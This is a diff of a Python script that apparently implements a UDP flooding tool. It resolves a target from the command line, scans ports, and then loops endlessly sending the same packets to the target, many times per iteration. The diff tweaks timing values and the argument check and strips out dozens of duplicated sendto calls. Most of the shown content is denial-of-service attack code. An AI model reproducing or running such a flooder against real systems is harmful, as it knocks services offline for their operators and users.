@@ -1,8 +1,8 @@
 
 import socket, threading, os, sys, random, ctypes, time
 
-delay=20
-psc=50
+delay=1
+psc=5
 ux=3
 port = 1
 sent = 0
@@ -52,7 +52,7 @@ target=ip
 
 
 
-if len(sys.argv) == 2:
+if len(sys.argv) == 5:
     target = socket.gethostbyname(sys.argv[1])
 
 
@@ -101,7 +101,7 @@ def main():
     psc=int(input("││ :"))
 
     type("││ scanning for around ")
-    print(delay*ux+(psc*0.002),end=" ")
+    print(delay*ux+(psc*0.001),end=" ")
     type("seconds")
     print()
     for kk in range(ux):
@@ -1162,89 +1162,7 @@ while True:
          sock.sendto(bytes, (ipp,int(open)))
          sock.sendto(bytes, (ipp,int(open)))
          sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
-         sock.sendto(bytes, (ipp,int(open)))
+        
 
 
      
